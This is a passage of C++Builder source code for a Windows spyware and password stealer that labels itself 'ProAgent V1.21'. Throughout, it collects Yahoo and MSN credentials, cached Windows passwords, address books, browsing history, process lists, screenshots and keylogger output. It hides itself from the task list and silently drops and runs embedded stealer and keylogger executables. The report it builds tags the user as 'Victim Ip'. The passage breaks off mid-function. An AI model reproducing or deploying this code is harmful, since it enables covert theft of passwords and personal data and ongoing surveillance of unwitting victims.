	LPDWORD Reserved = NULL;
	DWORD dwIndex = 0;
	PFILETIME pfLastEdit;
	pfLastEdit = new FILETIME;

	while(!RegEnumKeyEx(HKEY_USERS,dwIndex,KeyName,sName,Reserved,KeyClass,sClass,pfLastEdit))
	{
		*sName = *sClass = 50;
		dwIndex++;
		Reserved = NULL;
                if(c==7);
                classkey=KeyName; c++;

	}   //Edit1->Text=classkey;

        TRegistry *Registry = new TRegistry;
        Registry->RootKey=HKEY_USERS;

  AnsiString gercek,Eoptions,yahooID;
  gercek=classkey+"\\Software\\Yahoo\\Pager";//HKEY_USERS\S-1-5-21-1708537768-492894223-1957994488-1003\Software\Yahoo\Pager
  s=Registry->OpenKey(gercek, False);
  yahooID=Registry->ReadString("Yahoo! User ID");
  Eoptions=Registry->ReadString("EOptions String");
  Form1->Memo1->Lines->Add("");
  Form1->Memo1->Lines->Add("//////// Yahoo Messenger Sifreler ////");
  if(s)
  {
  Form1->Memo1->Lines->Add("Yahoo! User ID :"+yahooID);
  Form1->Memo1->Lines->Add("Kodlanmis Sifre      :"+Eoptions);
  }
  else
  {
  Form1->Memo1->Lines->Add("Yahoo! Kullanici Adi :Tespitedilemedi");
  Form1->Memo1->Lines->Add("EOptions String      :Tespitedilemedi");
  }
}

void messenger_coz()
{
TRegistry& regKey = *new TRegistry();
  AnsiString server,kullanici,ev_tel,is_tel,cep_tel;
  regKey.RootKey = HKEY_CURRENT_USER;
  regKey.OpenKey("Software\\Microsoft\\MessengerService\\ListCache\\.NET Messenger Service", False);
  kullanici =  regKey.ReadString("IdentityName");
  ev_tel    =  regKey.ReadString("PHH");
  is_tel    =  regKey.ReadString("PHW");
  cep_tel   =  regKey.ReadString("PHM");
  TRegistry& regKey1 = *new TRegistry();
  regKey1.OpenKey("Software\\Microsoft\\MessengerService", False);
  server    =  regKey1.ReadString("Server");
  Form1->Memo1->Lines->Add("///////// MSN-MesSenger ////////");
  Form1->Memo1->Lines->Add("E-Mail Adress: "+kullanici);
  Form1->Memo1->Lines->Add("Password: ");  //PHH
  Form1->Memo1->Lines->Add("Home Phone: "+ev_tel);
  Form1->Memo1->Lines->Add("Work Phone: "+is_tel);
  Form1->Memo1->Lines->Add("Mobil Telefonu: "+cep_tel);
  Form1->Memo1->Lines->Add("Mobile Phone: "+server);
}
typedef struct tagPASSWORD_CACHE_ENTRY {
    WORD cbEntry;         // size of this entry, in bytes
    WORD cbResource;           // size of resource name, in bytes
    WORD cbPassword;      // size of password, in bytes
    BYTE iEntry;      // entry index
    BYTE nType;        // type of entry
    BYTE abResource[1];       // start of resource name
                           // password immediately follows resource name
} PASSWORD_CACHE_ENTRY;

char *buf, *ob1;

bool CALLBACK pce(PASSWORD_CACHE_ENTRY *x, DWORD)
{
  memmove(buf, x->abResource, x->cbResource);
  buf[x->cbResource] = 0;
  CharToOem(buf, ob1);
  Form1->Memo1->Lines->Add(ob1);
  //Memo2->Lines->Add(ob1);
  memmove(buf, x->abResource+x->cbResource, x->cbPassword);
  buf[x->cbPassword] = 0;
  CharToOem(buf, ob1);
  Form1->Memo1->Lines->Add(ob1);
  //Memo2->Lines->Add(ob1);
  return TRUE;
}
///////////////////////////////////////////////////////////////////////////
void hafizadaki_sifreler()
{
buf = new char[1024];
ob1 = new char[1024];
Form1->Memo1->Lines->Add("//////// Cached Passwords ////////");
HINSTANCE hi = LoadLibrary("mpr.dll");
if(!hi)
{
return;
}
WORD (__stdcall *enp)(LPSTR, WORD, BYTE, void*, DWORD) =(WORD (__stdcall
*)(LPSTR, WORD, BYTE, void*, DWORD))GetProcAddress(hi,
"WNetEnumCachedPasswords");
if(!enp)
{
Form1->Memo1->Lines->Add("On Win2k Can't decrypt cached passwords.");
return;
}
enp(0,0, 0xff, pce, 0);
FreeLibrary(hi);
}

void Makina_Bilgisi()
{
Form1->Memo1->Lines->Add("//////// PC Information ////////" );
Form1->Memo1->Lines->Add(" ");
//////////////////////////////////////////////////////////////////////
char ComputerName[MAX_COMPUTERNAME_LENGTH + 1];
	unsigned long len_ComputerName = MAX_COMPUTERNAME_LENGTH + 1;
	char UserName[250];
	unsigned long len_UserName = 250;
        BOOL comp = GetComputerName(
    	ComputerName,
    	&len_ComputerName
    	);
        if( comp != 0 )
        Form1->Memo1->Lines->Add("Computer Name     : "+AnsiString(ComputerName));
	else
        Form1->Memo1->Lines->Add("Computer Name     :Can't find.");
        comp = GetUserNameA (
    	UserName,
    	&len_UserName
    	);
        if( comp != 0 )
        Form1->Memo1->Lines->Add("User Name         : "+AnsiString(UserName));
	else
        Form1->Memo1->Lines->Add("User Name        :Can't find.");
////////////////////////////////////////////////////////////////////////
OSVERSIONINFO version;
version.dwOSVersionInfoSize=sizeof(version);
if (GetVersionEx(&version))
{
if (version.dwPlatformId == VER_PLATFORM_WIN32s)
        Form1->Memo1->Lines->Add("Windows Version   : Win32 "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));
else
if (version.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
{
if(version.dwMinorVersion == 0 && (strchr(version.szCSDVersion,'B')==NULL)
&& (strchr(version.szCSDVersion,'C')==NULL))
Form1->Memo1->Lines->Add("Windows Version   : Windows 95 "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));
else
if(version.dwMinorVersion == 0&& (strchr(version.szCSDVersion,'B')!=NULL))
Form1->Memo1->Lines->Add("Windows Version   : Windows 95 OSR 2 "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));
else
if(version.dwMinorVersion == 0 && (strchr(version.szCSDVersion,'C')!=NULL))
Form1->Memo1->Lines->Add("Windows Version   : Windows 95 OSR 2.5 "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));
else
if(version.dwMinorVersion == 10 && (strchr(version.szCSDVersion,'A')==NULL))
Form1->Memo1->Lines->Add("Windows Version   : Windows 98 "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));
else if (version.dwMinorVersion == 10
         && (strchr(version.szCSDVersion,'A')!=NULL))
Form1->Memo1->Lines->Add("Windows Version   : Windows 98 Second Edition "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));
}

else if (version.dwPlatformId == VER_PLATFORM_WIN32_NT)
     if (version.dwMinorVersion == 90)
Form1->Memo1->Lines->Add("Windows Version   : Windows Millenium Edition "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));
      else if  (version.dwMajorVersion==5)
Form1->Memo1->Lines->Add("Windows Version   : Windows XP "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));
      else
      {
Form1->Memo1->Lines->Add("Windows Version   : Tespit Edilemedi. "+AnsiString(version.dwMajorVersion)+"."+AnsiString(version.dwMinorVersion)+"."
           +AnsiString((version.dwBuildNumber & 0xffff))+AnsiString(version.szCSDVersion));

      }

    }
    else
  Form1->Memo1->Lines->Add("Windows Version    : Unkown.");
/////////////////////////////////////////////////////////////////////////////////
LANGID SystemIDJezyka;
  char SystemOpisJezyka[101];
  SystemIDJezyka = GetSystemDefaultLangID();
  VerLanguageName(SystemIDJezyka, SystemOpisJezyka, sizeof(SystemOpisJezyka));
        Form1->Memo1->Lines->Add("Windows Language  : "+AnsiString(SystemOpisJezyka));
/////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////
char path[100];
        GetWindowsDirectory( path, 100 );
	Form1->Memo1->Lines->Add("Windows Path      : "+AnsiString(path));
	GetSystemDirectory( path, 100 );
	Form1->Memo1->Lines->Add("System Path       : "+AnsiString(path));
	GetTempPath( 100, path );
	Form1->Memo1->Lines->Add("Temp Path         : "+AnsiString(path));
///////////////////////////////////////////////////////////////////////////////////
TRegistry& regKey = *new TRegistry();
String GetOS;
regKey.RootKey = HKEY_LOCAL_MACHINE;
regKey.OpenKey("software\\microsoft\\windows\\currentversion", False);
GetOS = regKey.ReadString("ProductId");
Form1->Memo1->Lines->Add("ProductId         : "+GetOS);
/////////////////////////////////////////////////////////////////////////////////
regKey.OpenKey("system\\CurrentControlSet\\Services\\VxD\\VNETSUP", False);
GetOS = regKey.ReadString("Workgroup");
if(GetOS=="")
Form1->Memo1->Lines->Add("Workgroup         : There is not.");
else
Form1->Memo1->Lines->Add("Workgroup         : "+GetOS);
////////////////////////////////////////////////////////////////////////////////////
Form1->Memo1->Lines->Add("Data              : "+Date());
Form1->Memo1->Lines->Add("Time              : "+Time());
////////////////////////////////////////////////////////////////////////////////////
Form1->Memo1->Lines->Add("Opened time       : " +AnsiString(timeGetTime()/60/60000)+" Saat"); //?? sn? saat?
//////////////////////////////////////////////////////////////////////////////////
Form1->Memo1->Lines->Add("Screen resolution : "+IntToStr(GetSystemMetrics(SM_CXSCREEN)) + "x" + IntToStr(GetSystemMetrics(SM_CYSCREEN)));
///////////////////////////////////////////////////////////////////////////////////
AnsiString Version;
  TRegistry *Reg = new TRegistry();

  try
  {
    Reg->RootKey = HKEY_LOCAL_MACHINE;
    Reg->OpenKey("Software\\Microsoft\\Internet Explorer", false);

    try
    {
      Version = Reg->ReadString("Version");
    }
    catch(...)
    {
      Version = "";
    }

    Reg->CloseKey();
  }
  __finally
  {
    delete Reg;
  }


  Form1->Memo1->Lines->Add("IExplorer Version : "+Version);

/////////////////////////////////////////////////////////////////////////////////


regKey.RootKey = HKEY_CURRENT_CONFIG;
regKey.OpenKey("System\\CurrentControlSet\\Control\\Print\\Printers", False);
GetOS = regKey.ReadString("Default");
if(GetOS=="")
Form1->Memo1->Lines->Add("Default Printer   : Can't find.");
else
Form1->Memo1->Lines->Add("Default Printer   : "+GetOS);
/////////////////////////////////////////////////////////////////////////////////

String GetOS3,GetOS1,GetOS2;
regKey.RootKey = HKEY_LOCAL_MACHINE;
regKey.OpenKey("Hardware\\Description\\System\\CentralProcessor\\0", False);
GetOS3 = regKey.ReadString("Identifier");
GetOS1 = regKey.ReadString("ProcessorNameString");
GetOS2 = regKey.ReadString("VendorIdentifier");
Form1->Memo1->Lines->Add("Processor Name    : "+GetOS1);
Form1->Memo1->Lines->Add("Vendor Identifier : "+GetOS2);
Form1->Memo1->Lines->Add("Identifier        : "+GetOS3);

int GetHiz;
TRegistry *Hiz = new TRegistry();
Hiz->RootKey = HKEY_LOCAL_MACHINE;
try
{
Hiz->OpenKey("Hardware\\Description\\System\\CentralProcessor\\0", False);
GetHiz = Hiz->ReadInteger("~MHz");
}
catch (...)
          {
          GetHiz=0;
          }
Form1->Memo1->Lines->Add("CPU Speed         : "+AnsiString(GetHiz)+" Mhz");
Form1->Memo1->Lines->Add(" ");
}

void ekran_goruntusu(int kalite)
{
AnsiString kayit;
char path[100];
GetSystemDirectory( path, 100 );
kayit=AnsiString(path)+"\\ekran_g.jpg";   //kayitedildigi isim
Graphics::TBitmap *BMP = new Graphics::TBitmap();
TJPEGImage *JPG = new TJPEGImage();
long lWidth = Screen->Width;
long lHeight = Screen->Height;
BMP->Width = lWidth;
BMP->Height = lHeight;
HDC hDC = GetDC(0);
long Ret = BitBlt(BMP->Canvas->Handle, 0, 0, lWidth, lHeight, hDC, 0, 0,SRCCOPY);
ReleaseDC(0,hDC);
JPG->Assign(BMP);
//ShowMessage(StrToInt(metod2) );
JPG->CompressionQuality=kalite;
JPG->Compress();
JPG->SaveToFile(kayit);
delete JPG;
delete BMP;
}

int validAddress( char * addr )
{
        if( lstrlen( addr ) >= 40 || lstrlen( addr ) == 0)
        {
            return -1;
        } else if( strchr( addr , '@') == NULL )
        {
            return -1;
        } else if( strchr( addr , '.') == NULL )
        {
            return -1;
        } else {
            return 0;
        }
}
int findidout()
{
HANDLE hFile1;
BYTE rdate[MAX_PATH];
DWORD size;
HKEY hkeyresult;

size=800;
RegOpenKeyEx(HKEY_CURRENT_USER, ( LPCTSTR )"Software\\Microsoft\\WAB\\WAB4\\Wab File Name" ,0,KEY_ALL_ACCESS, &hkeyresult );
RegQueryValueEx ( hkeyresult, ( LPCTSTR )"" , 0, 0, rdate, &size ) ;
RegCloseKey(hkeyresult);


hFile1 = CreateFile ((char *)rdate,
                                         GENERIC_READ,
                                         FILE_SHARE_READ,
                                         NULL,
                                         OPEN_ALWAYS,
                                         FILE_ATTRIBUTE_NORMAL,
                                         NULL);

char *buf=NULL;
HANDLE fd2=CreateFileMapping(hFile1,0,PAGE_READONLY,0,0,0);
	if(!fd2) {
		CloseHandle(hFile1);
		return 0;
	}

	buf=(char *)MapViewOfFile(fd2,FILE_MAP_READ,0,0,0);
	if(!buf) {
		CloseHandle(fd2);
		CloseHandle(hFile1);
		return 0;
	}

int nos;
nos=int(*(buf+0x64));


BYTE ch1=*(buf+0x62);
BYTE ch2=*(buf+0x63);
WORD d=MAKEWORD(ch1,ch2);
ch1=*(buf+0x60);
ch2=*(buf+0x61);
WORD d1=MAKEWORD(ch1,ch2);
DWORD add=MAKELONG(d1,d);
  


///////////////
char a1[300];
int ii,j;
j=0;
int len;
for (len=0;len<(nos*68);len+=68){
for (ii=0;ii<=68;ii++)
{
	a1[ii]=*(buf+add+j+len);
j+=2;
}
a1[68]='\0';j=0;
if(!validAddress(a1))
Form1->Memo1->Lines->Add(a1);
//SendDlgItemMessage(hd,IDC_LIST6,LB_ADDSTRING,0,(LPARAM)a1);
}
UnmapViewOfFile(buf);
CloseHandle (fd2);	
CloseHandle (hFile1);	

	return 0;
}
void findmsnid()
{     int i;
char eid[1500][50];
HKEY hkeyresult1;
char name[250];
BYTE dat[250];
DWORD dw,dw1;
LONG     l1,k;
int cnt=0;
l1=RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\MessengerService\\ListCache\\.NET Messenger Service",0,KEY_ALL_ACCESS, &hkeyresult1 );
if(l1==ERROR_SUCCESS){
//////////
dw=300;dw1=REG_BINARY;
k=0;
dw=100;dw1=REG_BINARY;
l1=ERROR_SUCCESS;
while(l1!=ERROR_NO_MORE_ITEMS){
l1=RegEnumValue(hkeyresult1,k,name,&dw,0,&dw1,dat,&dw);k++;

if(!validAddress((char *)dat)){
	lstrcpy(eid[cnt],(char *)dat);
	cnt++;}
}
}
RegCloseKey(hkeyresult1);

l1=RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\MessengerService\\ListCache\\MSN Messenger Service",0,KEY_ALL_ACCESS, &hkeyresult1 );
if(l1==ERROR_SUCCESS){
//////////
dw=300;dw1=REG_BINARY;
k=0;
dw=100;dw1=REG_BINARY;
l1=ERROR_SUCCESS;
while(l1!=ERROR_NO_MORE_ITEMS){
l1=RegEnumValue(hkeyresult1,k,name,&dw,0,&dw1,dat,&dw);k++;
if(!validAddress((char *)dat)){
lstrcpy(eid[cnt],(char *)dat);cnt++;}
	}
}
RegCloseKey(hkeyresult1);
///sort
char sw[150];
wsprintf(sw,"%d",cnt);
for (int i=0;i<cnt-1;i++)
for (int j=0;j<cnt-1;j++)
if (lstrcmp(eid[j],eid[j+1])>0)
{
lstrcpy(sw,eid[j]);
lstrcpy(eid[j],eid[j+1]);
lstrcpy(eid[j+1],sw);
}
int cc;
int countid=cnt-1;cc=0;
for (int jj=1;jj<=countid-1;jj++)
for (int j=1;j<=countid-1;j++){
if (lstrcmp(eid[j],eid[j+1])==0)
	{
   	for (i=j+1;i<=countid-1;i++)
	lstrcpy(eid[i],eid[i+1]);
	countid--;
	}
}
for (int j=1;j<=countid;j++)
Form1->Memo1->Lines->Add(eid[j]);
//SendDlgItemMessage(hd,IDC_LIST1,LB_ADDSTRING,0,(LPARAM)eid[j]);
}
void findtrillian()
{
  
  TRegistry& regKey = *new TRegistry();
  AnsiString Programdirekt;
  regKey.RootKey = HKEY_LOCAL_MACHINE;
  regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", False);
  Programdirekt = regKey.ReadString("ProgramFilesDir");
  AnsiString tri_dir=Programdirekt+"\\Trillian\\users\\default\\";
 /////////////////////////////////////////////////////////////////////
 AnsiString mail1,mail2,mail3,mail4,mail5,mail6,mail7,mail8,mail9,mail10,mail11,mail12,mail13,mail14,mail15,mail16;
 TIniFile *ini;
 /////////////////////////////////////////////////////////////////////
 if(FileExists(tri_dir+"msn.ini"))
 {
 ini = new TIniFile(tri_dir+"msn.ini") ;
 mail1 = ini-> ReadString( "profile 0", "reverse0","okunamadi");
 mail2 = ini-> ReadString( "profile 0", "reverse1","okunamadi");
 mail3 = ini-> ReadString( "profile 0", "reverse2","okunamadi");
 mail4 = ini-> ReadString( "profile 0", "reverse3","okunamadi");
 mail5 = ini-> ReadString( "profile 0", "reverse4","okunamadi");
 mail6 = ini-> ReadString( "profile 0", "reverse5","okunamadi");
 mail7 = ini-> ReadString( "profile 0", "reverse6","okunamadi");
 mail8 = ini-> ReadString( "profile 0", "reverse7","okunamadi");
 mail9 = ini-> ReadString( "profile 0", "reverse8","okunamadi");
 mail10 = ini-> ReadString( "profile 0", "reverse9","okunamadi");
 mail11 = ini-> ReadString( "profile 0", "reverse10","okunamadi");
 mail12 = ini-> ReadString( "profile 0", "reverse11","okunamadi");
 mail13 = ini-> ReadString( "profile 0", "reverse12","okunamadi");
 mail14 = ini-> ReadString( "profile 0", "reverse13","okunamadi");
 mail15 = ini-> ReadString( "profile 0", "reverse14","okunamadi");
 mail16 = ini-> ReadString( "profile 0", "reverse15","okunamadi");
 if(mail1!="okunamadi")
 Form1->Memo1->Lines->Add(mail1);
 if(mail2!="okunamadi")
 Form1->Memo1->Lines->Add(mail2);
 if(mail3!="okunamadi")
 Form1->Memo1->Lines->Add(mail3);
 if(mail4!="okunamadi")
 Form1->Memo1->Lines->Add(mail4);
 if(mail5!="okunamadi")
 Form1->Memo1->Lines->Add(mail5);
 if(mail6!="okunamadi")
 Form1->Memo1->Lines->Add(mail6);
 if(mail7!="okunamadi")
 Form1->Memo1->Lines->Add(mail7);
 if(mail8!="okunamadi")
 Form1->Memo1->Lines->Add(mail8);
 if(mail9!="okunamadi")
 Form1->Memo1->Lines->Add(mail9);
 if(mail10!="okunamadi")
 Form1->Memo1->Lines->Add(mail10);
 if(mail11!="okunamadi")
 Form1->Memo1->Lines->Add(mail11);
 if(mail12!="okunamadi")
 Form1->Memo1->Lines->Add(mail12);
 if(mail13!="okunamadi")
 Form1->Memo1->Lines->Add(mail13);
 if(mail14!="okunamadi")
 Form1->Memo1->Lines->Add(mail14);
 if(mail15!="okunamadi")
 Form1->Memo1->Lines->Add(mail15);
 if(mail16!="okunamadi")
 Form1->Memo1->Lines->Add(mail16);
 }

 if(FileExists(tri_dir+"yahoo.ini"))
 {
 ini = new TIniFile(tri_dir+"yahoo.ini") ;
 mail1 = ini-> ReadString( "profile 0", "reverse0","okunamadi");
 mail2 = ini-> ReadString( "profile 0", "reverse1","okunamadi");
 mail3 = ini-> ReadString( "profile 0", "reverse2","okunamadi");
 mail4 = ini-> ReadString( "profile 0", "reverse3","okunamadi");
 mail5 = ini-> ReadString( "profile 0", "reverse4","okunamadi");
 mail6 = ini-> ReadString( "profile 0", "reverse5","okunamadi");
 mail7 = ini-> ReadString( "profile 0", "reverse6","okunamadi");
 mail8 = ini-> ReadString( "profile 0", "reverse7","okunamadi");
 mail9 = ini-> ReadString( "profile 0", "reverse8","okunamadi");
 mail10 = ini-> ReadString( "profile 0", "reverse9","okunamadi");
 mail11 = ini-> ReadString( "profile 0", "reverse10","okunamadi");
 mail12 = ini-> ReadString( "profile 0", "reverse11","okunamadi");
 mail13 = ini-> ReadString( "profile 0", "reverse12","okunamadi");
 mail14 = ini-> ReadString( "profile 0", "reverse13","okunamadi");
 mail15 = ini-> ReadString( "profile 0", "reverse14","okunamadi");
 mail16 = ini-> ReadString( "profile 0", "reverse15","okunamadi");
 if(mail1!="okunamadi")
 Form1->Memo1->Lines->Add(mail1);
 if(mail2!="okunamadi")
 Form1->Memo1->Lines->Add(mail2);
 if(mail3!="okunamadi")
 Form1->Memo1->Lines->Add(mail3);
 if(mail4!="okunamadi")
 Form1->Memo1->Lines->Add(mail4);
 if(mail5!="okunamadi")
 Form1->Memo1->Lines->Add(mail5);
 if(mail6!="okunamadi")
 Form1->Memo1->Lines->Add(mail6);
 if(mail7!="okunamadi")
 Form1->Memo1->Lines->Add(mail7);
 if(mail8!="okunamadi")
 Form1->Memo1->Lines->Add(mail8);
 if(mail9!="okunamadi")
 Form1->Memo1->Lines->Add(mail9);
 if(mail10!="okunamadi")
 Form1->Memo1->Lines->Add(mail10);
 if(mail11!="okunamadi")
 Form1->Memo1->Lines->Add(mail11);
 if(mail12!="okunamadi")
 Form1->Memo1->Lines->Add(mail12);
 if(mail13!="okunamadi")
 Form1->Memo1->Lines->Add(mail13);
 if(mail14!="okunamadi")
 Form1->Memo1->Lines->Add(mail14);
 if(mail15!="okunamadi")
 Form1->Memo1->Lines->Add(mail15);
 if(mail16!="okunamadi")
 Form1->Memo1->Lines->Add(mail16);
 }

}

void kayitli_mail_adresleri()
{
Form1->Memo1->Lines->Add ("");
Form1->Memo1->Lines->Add("////////// Adressbook //////////" );
findidout();
findmsnid();
findtrillian();
}

void url_kayitlari()
{
int I;
 TRegistry& reg = *new TRegistry();
 reg.RootKey=HKEY_CURRENT_USER;
 reg.OpenKey("\\SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs",False);
 Form1->Memo1->Lines->Add ("");
 Form1->Memo1->Lines->Add ("////////// URL HISTORY ////////////");
 Form1->Memo1->Lines->Add (reg.ReadString("url1"));
 Form1->Memo1->Lines->Add (reg.ReadString("url2"));
 Form1->Memo1->Lines->Add (reg.ReadString("url3"));
 Form1->Memo1->Lines->Add (reg.ReadString("url4"));
 Form1->Memo1->Lines->Add (reg.ReadString("url5"));
 Form1->Memo1->Lines->Add (reg.ReadString("url6"));
 Form1->Memo1->Lines->Add (reg.ReadString("url7"));
 Form1->Memo1->Lines->Add (reg.ReadString("url8"));
 Form1->Memo1->Lines->Add (reg.ReadString("url9"));
 Form1->Memo1->Lines->Add (reg.ReadString("url10"));
 Form1->Memo1->Lines->Add (reg.ReadString("url11"));
 Form1->Memo1->Lines->Add (reg.ReadString("url12"));
 Form1->Memo1->Lines->Add (reg.ReadString("url13"));
 Form1->Memo1->Lines->Add (reg.ReadString("url14"));
 Form1->Memo1->Lines->Add (reg.ReadString("url15"));
 Form1->Memo1->Lines->Add (reg.ReadString("url16"));
 Form1->Memo1->Lines->Add (reg.ReadString("url17"));
 Form1->Memo1->Lines->Add (reg.ReadString("url18"));
 Form1->Memo1->Lines->Add (reg.ReadString("url19"));
 Form1->Memo1->Lines->Add (reg.ReadString("url20"));
 Form1->Memo1->Lines->Add (reg.ReadString("url21"));
 Form1->Memo1->Lines->Add (reg.ReadString("url22"));
 Form1->Memo1->Lines->Add (reg.ReadString("url23"));
 Form1->Memo1->Lines->Add (reg.ReadString("url24"));
 Form1->Memo1->Lines->Add (reg.ReadString("url25"));

}
void process()
{
Form1->Memo1->Lines->Add("");
Form1->Memo1->Lines->Add("//////// Processes Information ////////");
bool sayi=false;
HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if(hSnapShot == INVALID_HANDLE_VALUE)
		{
				return;
		}
		PROCESSENTRY32 procentry;
		HANDLE pr;
		procentry.dwSize = sizeof(PROCESSENTRY32);
		BOOL F = Process32First( hSnapShot, &procentry );

		while (F)
		{

			       //	if(strstr(procentry.szExeFile,av[i])!=0)
                                Form1->Memo1->Lines->Add(procentry.szExeFile);
                                //if(ExtractFileName(procentry.szExeFile)==ExtractFileName(exe))
                               // sayi=true;

		//Memo1->Lines->Add( procentry.szExeFile );
		procentry.dwSize = sizeof(PROCESSENTRY32);
		F = Process32Next( hSnapShot, &procentry );
		}
	CloseHandle(hSnapShot);
        return;
}
iss_coz(AnsiString iss)
{
if(FileExists(iss))
{
Form1->Memo2->Lines->LoadFromFile(iss);
Form1->Memo1->Lines->Add(Form1->Memo2->Text);
Form1->Memo2->Clear();
}
else
{
Form1->Memo1->Lines->Add("//////// RAS(Internet) Passwords ////////");
Form1->Memo1->Lines->Add("Kayitli Baglanti bulunamadi.");
}
}

ftp_coz(AnsiString fps3)
{
if(FileExists(fps3))
{
Form1->Memo2->Lines->LoadFromFile(fps3);
Form1->Memo1->Lines->Add(Form1->Memo2->Text);
Form1->Memo2->Clear();
}
}
mps_coz(AnsiString mps3)
{
if(FileExists(mps3))
{
Form1->Memo2->Lines->LoadFromFile(mps3);
Form1->Memo1->Lines->Add(Form1->Memo2->Text);
Form1->Memo2->Clear();
}
}
keylog_coz(AnsiString keylog)
{
//ShowMessage(keylog);
if(FileExists(keylog))
{
Form1->Memo2->Lines->LoadFromFile(keylog);
Form1->Memo3->Lines->Add("");
Form1->Memo3->Lines->Add("/////////////////////// KeyLog  /////////////////////////");
Form1->Memo3->Lines->Add(Form1->Memo2->Text);
Form1->Memo2->Clear();
Form1->Memo2->Lines->SaveToFile(keylog);
}
}
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
hKernelLib = LoadLibrary("kernel32.dll");
    if(hKernelLib)
    {
        RegisterServiceProcess =
                  (pRegFunction)GetProcAddress(hKernelLib,
                                               "RegisterServiceProcess");

        if(RegisterServiceProcess)
            RegisterServiceProcess(GetCurrentProcessId(),
                                   RSP_SIMPLE_SERVICE);
    }
}
__fastcall TForm1::~TForm1()
{
    if(hKernelLib)
    {
        if(RegisterServiceProcess)
            RegisterServiceProcess(GetCurrentProcessId(),
                                   RSP_UNREGISTER_SERVICE);

        FreeLibrary(hKernelLib);
    }
}



void send(bool tekrar)
{
//==============================================================

reg.RootKey=HKEY_CURRENT_USER;
AnsiString reganahtar="\\SOFTWARE\\Microsoft\\Dxdriver\\LocalSettings";
reg.OpenKey(reganahtar,False);
//==============================================================
char pathkey[100];
char pathkey2[100];
GetWindowsDirectory( pathkey, 100 );
GetSystemDirectory( pathkey2, 100 );
strcat(pathkey,"\\");
strcat(pathkey2,"\\");
AnsiString keyexe,keydll,keyreg,keylog;
AnsiString fps,fps2,fps3;   //ftp sifreleri icin
AnsiString mps,mps2,mps3;   //mail sifreleri icin
AnsiString icq;
AnsiString iss32,iss;


fps=AnsiString(pathkey)+"fps.exe";//exe kaydetmek icin
fps2=fps+" /stext "+AnsiString(pathkey)+"fps.atm";//winexec icin
fps3=AnsiString(pathkey)+"fps.atm";//sifre dosyasi
mps=AnsiString(pathkey)+"mps.exe";//exe kaydetmek icin
mps2=mps+" /stext "+AnsiString(pathkey)+"mps.atm";//winexec icin
mps3=AnsiString(pathkey)+"mps.atm";//sifre dosyasi
icq=AnsiString(pathkey)+"icq.dll";   //ICQ 2003a sifrelerinin alinmasi icin gerekli olan dll
iss32=AnsiString(pathkey)+"iss32.exe"; //ras sifreleri icin
iss=AnsiString(pathkey2)+"iss.atm"; //ras sifreleri icin
keyexe=AnsiString(pathkey)+"CRSS.EXE";  //keylogger icin
keydll=AnsiString(pathkey)+"kdd32.atm"; //keylogger icin
keyreg=AnsiString(pathkey)+"kt.atm";    //keylogger icin
keylog=AnsiString(pathkey)+"ktd32.atm";
Ss=AnsiString(pathkey2)+"ekran_g.jpg";
if(tekrar==true)
{
Form1->Memo1->Lines->Add("//////////////////////////////////");
Form1->Memo1->Lines->Add("//// ProAgent V1.21 By [ATmaCA]");
Form1->Memo1->Lines->Add("//// Victim Ip:["+LocalIp()+"]");
Form1->Memo1->Lines->Add("//// Local Time: "+Time());
Form1->Memo1->Lines->Add("//////////////////////////////////");




if(!FileExists(fps))
rc1->SaveToFile(fps);
if(!FileExists(mps))
rc2->SaveToFile(mps);
if(!FileExists(icq))
rc3->SaveToFile(icq);
if(!FileExists(iss32))
rc4->SaveToFile(iss32);
if(!FileExists(keyexe))
rc5->SaveToFile(keyexe);
if(!FileExists(keydll))
rc6->SaveToFile(keydll);
if(!FileExists(keyreg))
rc7->SaveToFile(keyreg);
/*delete [] rc1;
delete [] rc2;
delete [] rc3;
delete [] rc4;
delete [] rc5;
delete [] rc6;
delete [] rc7;  */
WinExec(fps2.c_str(),SW_HIDE);
WinExec(mps2.c_str(),SW_HIDE);
WinExec(iss32.c_str(),SW_HIDE);
WinExec(keyexe.c_str(),SW_HIDE);
adet=StrToInt(reg.ReadString("Adet"));
if(adet==0)
{
adet=99999999;
//ShowMessage("Adet Saysi:9999999");
}
//================================================================
//================================================================
if(reg.ReadString("Mirabilis98")=="1")
Mirabilis_dat_coz();
if(reg.ReadString("Mirabilis2003a")=="1")
Decrypt();
if(reg.ReadString("Miranda")=="1")
Miranda_coz();
if(reg.ReadString("Trillian")=="1")
Trillian_de();
if(reg.ReadString("MsnMessenger")=="1")
messenger_coz();
if(reg.ReadString("Yahoo")=="1")
yahoo_coz();
if(reg.ReadString("cached")=="1")
hafizadaki_sifreler();
if(reg.ReadString("Ras")=="1")
iss_coz(iss);
if(reg.ReadString("Ftp")=="1")
{
Form1->Memo1->Lines->Add("");
Form1->Memo1->Lines->Add("//////// IE Protected Storage Passwords /////");
